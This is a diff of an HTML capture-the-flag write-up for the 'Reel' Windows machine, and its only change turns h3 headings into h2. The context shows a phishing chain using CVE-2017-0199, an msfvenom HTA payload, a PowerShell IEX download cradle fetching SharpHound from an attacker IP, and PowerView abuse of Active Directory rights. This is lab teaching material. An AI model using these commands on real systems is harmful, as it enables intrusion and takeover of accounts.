@@ -64,7 +64,7 @@
   <div class="post-content e-content" itemprop="articleBody">
     <p><img src="/assets/Reel/Reel.png" alt="Reel" /></p>
 
-<h3 id="summary">Summary</h3>
+<h2 id="summary">Summary</h2>
 <ul>
   <li>A <strong>windows machine</strong> with <code class="language-plaintext highlighter-rouge">Anonymous FTP</code> allowed. <em>Inspecting the contents</em> reveals a <strong>documents folder</strong> one of which tells us that <em>RTF documents are being reviewed and converted by someone</em>.</li>
   <li><em>Using this information,</em> we craft a <em>malicious document</em> using <strong>CVE-2017-0199</strong> and send it to a certain user called <code class="language-plaintext highlighter-rouge">nico</code> via the open <code class="language-plaintext highlighter-rouge">SMTP</code> port (<em>We find his username by checking the metadata of the documents on FTP</em>).</li>
@@ -81,7 +81,7 @@
 
 <hr />
 
-<h3 id="nmap">Nmap</h3>
+<h2 id="nmap">Nmap</h2>
 <p><em>Looking at the</em> <code class="language-plaintext highlighter-rouge">nmap</code> <em>scan,</em> we find very few ports running:</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION                                                                                      
 21/tcp open  ftp     Microsoft ftpd                                                                               
@@ -128,7 +128,7 @@
 |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
 </code></pre></div></div>
 
-<h3 id="anonymous-ftp">Anonymous FTP</h3>
+<h2 id="anonymous-ftp">Anonymous FTP</h2>
 <p><em>Checking</em> <strong>FTP</strong>, we come across 3 files:</p>
 <ul>
   <li><code class="language-plaintext highlighter-rouge">Applocker.docx</code></li>
@@ -138,13 +138,13 @@
 
 <p><img src="/assets/Reel/ftp-listing.jpg" alt="ftp-listing" /></p>
 
-<h3 id="contents-of-readmetxt">Contents of readme.txt</h3>
+<h2 id="contents-of-readmetxt">Contents of readme.txt</h2>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>please email me any rtf format procedures - I'll review and convert.
 
 new format / converted documents will be saved here.
 </code></pre></div></div>
 
-<h3 id="looks-like-were-going-phishing-d">Looks like we’re going phishing :D</h3>
+<h2 id="looks-like-were-going-phishing-d">Looks like we’re going phishing :D</h2>
 <p>the content is about someone asking to be emailed RTF formats (a type of document) for him/her to review and convert.</p>
 
 <p>This seems like a <strong>Phishing Challenge</strong>. <em>In order to exploit,</em> we need to:</p>
@@ -154,7 +154,7 @@ new format / converted documents will be saved here.
   <li>Find a way to send an email using the open SMTP port</li>
 </ol>
 
-<h3 id="enumerating-smtp">Enumerating SMTP</h3>
+<h2 id="enumerating-smtp">Enumerating SMTP</h2>
 <p>We use a tool called <code class="language-plaintext highlighter-rouge">smtp-user-enum</code> which lets us find if a given user exists or not.</p>
 
 <p>It uses a couple of <strong>SMTP</strong> commands to do that:</p>
@@ -175,7 +175,7 @@ new format / converted documents will be saved here.
 
 <p>That takes a while to run. And it comes up short. <em>So we move on…</em></p>
 
-<h3 id="checking-file-metadata-using-exiftool">Checking file metadata using <code class="language-plaintext highlighter-rouge">exiftool</code></h3>
+<h2 id="checking-file-metadata-using-exiftool">Checking file metadata using <code class="language-plaintext highlighter-rouge">exiftool</code></h2>
 
 <p>When we run <code class="language-plaintext highlighter-rouge">exiftool</code> against the <code class="language-plaintext highlighter-rouge">Windows Event Forwarding.docx</code> file, we do find a user called <code class="language-plaintext highlighter-rouge">nico</code> whose email is <code class="language-plaintext highlighter-rouge">nico@megabank.com</code></p>
 
@@ -183,7 +183,7 @@ new format / converted documents will be saved here.
 
 <p>we note this down and go verify this user using <code class="language-plaintext highlighter-rouge">smtp-user-enum</code></p>
 
-<h3 id="trying-various-smtp-methods-for-enumeration">Trying various SMTP methods for enumeration</h3>
+<h2 id="trying-various-smtp-methods-for-enumeration">Trying various SMTP methods for enumeration</h2>
 
 <p><em>when testing mulitple methods with the</em> <code class="language-plaintext highlighter-rouge">nico</code> <em>user</em>, we still get no hits :/</p>
 
@@ -197,7 +197,7 @@ new format / converted documents will be saved here.
 
 <p><img src="/assets/Reel/nico-rcpt.jpg" alt="nico-rcpt" /></p>
 
-<h3 id="working-on-the-phish">Working on the Phish</h3>
+<h2 id="working-on-the-phish">Working on the Phish</h2>
 
 <p>Doing a <strong>Google</strong> search shows an article about <strong>CVE-2017-0199</strong> which looks promising.</p>
 
@@ -225,7 +225,7 @@ new format / converted documents will be saved here.
 
 <p>What’s left is to send the email to <code class="language-plaintext highlighter-rouge">nico@megabank.com</code></p>
 
-<h3 id="sending-the-mail-and-some-deception-">Sending the mail and some deception ;)</h3>
+<h2 id="sending-the-mail-and-some-deception-">Sending the mail and some deception ;)</h2>
 <p>We’re going to use the <code class="language-plaintext highlighter-rouge">sendEmail</code> command with a couple flags:</p>
 <ul>
   <li><code class="language-plaintext highlighter-rouge">-t &lt;RECEPIENT&gt;</code></li>
@@ -252,7 +252,7 @@ new format / converted documents will be saved here.
 
 <p><img src="/assets/Reel/document-error-2.jpg" alt="document-error-2" /></p>
 
-<h3 id="triggering-the-exploit-chain">Triggering the exploit chain</h3>
+<h2 id="triggering-the-exploit-chain">Triggering the exploit chain</h2>
 <p><em>Having everything ready,</em> we trigger the chain:</p>
 
 <ol>
@@ -263,7 +263,7 @@ new format / converted documents will be saved here.
 
 <p><img src="/assets/Reel/exploit-chain.jpg" alt="exploit-chain" /></p>
 
-<h3 id="brief-note-on-the-article-content">Brief note on the article content</h3>
+<h2 id="brief-note-on-the-article-content">Brief note on the article content</h2>
 
 <p>The guide talks about using an <code class="language-plaintext highlighter-rouge">exe</code> file. We cannot do so because of <code class="language-plaintext highlighter-rouge">Applocker</code>.</p>
 
@@ -273,7 +273,7 @@ new format / converted documents will be saved here.
 
 <p>This is why we generated an <code class="language-plaintext highlighter-rouge">HTA</code> payload using <code class="language-plaintext highlighter-rouge">msfvenom</code> instead.</p>
 
-<h3 id="domain-enumeration-using-sharphoundps1">Domain Enumeration using <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code></h3>
+<h2 id="domain-enumeration-using-sharphoundps1">Domain Enumeration using <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code></h2>
 
 <p><em>Since running</em> <code class="language-plaintext highlighter-rouge">.exe</code> <em>is disabled by</em> <strong>Group Policy</strong>, we turn to <code class="language-plaintext highlighter-rouge">BloodHound</code>’s <strong>PowerShell ingestor</strong> (https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1) and run the <code class="language-plaintext highlighter-rouge">Invoke-BloodHound</code> method.</p>
 
@@ -288,7 +288,7 @@ new format / converted documents will be saved here.
 
 <p><code class="language-plaintext highlighter-rouge">powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/SharpHound.ps1')"</code></p>
 
-<h3 id="a-note-on-sharphoundps1-output">A note on <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> output:</h3>
+<h2 id="a-note-on-sharphoundps1-output">A note on <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> output:</h2>
 
 <p><code class="language-plaintext highlighter-rouge">Sharphound.ps1</code> will generate version 3 <code class="language-plaintext highlighter-rouge">JSON</code> files. Those <em>will not be compatible</em> with the most recent version of <strong>BloodHound</strong> (currently it’s at 4).</p>
 
@@ -296,7 +296,7 @@ new format / converted documents will be saved here.
 
 <p><em>To get it working,</em> we will need to get <code class="language-plaintext highlighter-rouge">BloodHound</code> version 3 from the <strong>Official Releases Page</strong> (https://github.com/BloodHoundAD/BloodHound/releases/tag/3.0.3)</p>
 
-<h3 id="investigating-possible-exploit-paths">Investigating Possible Exploit Paths</h3>
+<h2 id="investigating-possible-exploit-paths">Investigating Possible Exploit Paths</h2>
 
 <p><em>Upon looking at</em> <code class="language-plaintext highlighter-rouge">BloodHound</code>’s <em>output,</em> we notice that <code class="language-plaintext highlighter-rouge">nico</code> can set the <code class="language-plaintext highlighter-rouge">owner</code> for user <code class="language-plaintext highlighter-rouge">herman</code></p>
 
@@ -308,7 +308,7 @@ new format / converted documents will be saved here.
 
 <p><img src="/assets/Reel/herman-has-write-dacl.jpg" alt="herman-has-write-dacl" /></p>
 
-<h3 id="abusing-nicos-writeowner-right-over-herman">Abusing <code class="language-plaintext highlighter-rouge">nico</code>’s <code class="language-plaintext highlighter-rouge">WriteOwner</code> right over <code class="language-plaintext highlighter-rouge">herman</code></h3>
+<h2 id="abusing-nicos-writeowner-right-over-herman">Abusing <code class="language-plaintext highlighter-rouge">nico</code>’s <code class="language-plaintext highlighter-rouge">WriteOwner</code> right over <code class="language-plaintext highlighter-rouge">herman</code></h2>
 
 <p><em>Checking the help for the</em> <code class="language-plaintext highlighter-rouge">WriteOwner</code> <em>right</em>, we notice we can use <code class="language-plaintext highlighter-rouge">PowerView</code>’s <code class="language-plaintext highlighter-rouge">Set-DomainObjectOwner</code> function.</p>
 
@@ -338,7 +338,7 @@ new format / converted documents will be saved here.
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">herman</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$UserPassword</span><span class="w">
 </span></code></pre></div></div>
 
-<h3 id="logging-in-as-herman-and-joining-the-backup_admins-group">Logging in as herman and joining the <code class="language-plaintext highlighter-rouge">backup_admins</code> group</h3>
+<h2 id="logging-in-as-herman-and-joining-the-backup_admins-group">Logging in as herman and joining the <code class="language-plaintext highlighter-rouge">backup_admins</code> group</h2>
 
 <p><em>After resetting the password for</em> <code class="language-plaintext highlighter-rouge">herman</code>, we’re able to login via the open <code class="language-plaintext highlighter-rouge">SSH</code> port:</p>
 
@@ -348,7 +348,7 @@ new format / converted documents will be saved here.
 
 <p><img src="/assets/Reel/joining-backup-admins.jpg" alt="joining-backup-admins" /></p>
 
-<h3 id="file-system-access-with-backup_adminss-group-membership">File System access with <code class="language-plaintext highlighter-rouge">backup_admins</code>’s group membership</h3>
+<h2 id="file-system-access-with-backup_adminss-group-membership">File System access with <code class="language-plaintext highlighter-rouge">backup_admins</code>’s group membership</h2>
 
 <p>We first <em>relog</em> to <em>refresh our access</em> and check our newly-found acccess using <code class="language-plaintext highlighter-rouge">PowerShell</code>:</p>
 
@@ -369,7 +369,7 @@ new format / converted documents will be saved here.
 
 <p><img src="/assets/Reel/got-admin-path-1.jpg" alt="got-admin-path-1" /></p>
 
-<h3 id="exploit-path-2-nico---tom---claire--backup_admins">Exploit Path #2: <code class="language-plaintext highlighter-rouge">nico</code> -&gt; <code class="language-plaintext highlighter-rouge">tom</code> -&gt; <code class="language-plaintext highlighter-rouge">claire</code> &gt; <code class="language-plaintext highlighter-rouge">backup_admins</code></h3>
+<h2 id="exploit-path-2-nico---tom---claire--backup_admins">Exploit Path #2: <code class="language-plaintext highlighter-rouge">nico</code> -&gt; <code class="language-plaintext highlighter-rouge">tom</code> -&gt; <code class="language-plaintext highlighter-rouge">claire</code> &gt; <code class="language-plaintext highlighter-rouge">backup_admins</code></h2>
 
 <p>On <code class="language-plaintext highlighter-rouge">nico</code>’s desktop we find a file called <code class="language-plaintext highlighter-rouge">cred.xml</code></p>
 
@@ -401,7 +401,7 @@ new format / converted documents will be saved here.
 
 <p><img src="/assets/Reel/claire-to-backup-admins.jpg" alt="claire-to-backup-admins" /></p>
 
-<h3 id="exploit-path-3-metasploitation">Exploit Path #3: Metasploitation</h3>
+<h2 id="exploit-path-3-metasploitation">Exploit Path #3: Metasploitation</h2>
 
 <p>The same exploit for <strong>CVE-2017-0199</strong> exists in a <strong>Metasploit Module</strong> (<code class="language-plaintext highlighter-rouge">windows/fileformat/office_word_hta</code>) when we search using the <code class="language-plaintext highlighter-rouge">rtf</code> keyword:</p>
 
@@ -439,7 +439,7 @@ new format / converted documents will be saved here.
 
 <p>Of course these paths are not intended because it’s just using <code class="language-plaintext highlighter-rouge">MetaSploit</code></p>
 
-<h3 id="exploit-path-4-incomplete-abusing-seloaddriverprivilege">Exploit Path #4 (Incomplete): Abusing <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code></h3>
+<h2 id="exploit-path-4-incomplete-abusing-seloaddriverprivilege">Exploit Path #4 (Incomplete): Abusing <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code></h2>
 
 <p>The <code class="language-plaintext highlighter-rouge">tom</code> user is a member of the <code class="language-plaintext highlighter-rouge">Print Operators</code> Group which hold the <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code></p>
 
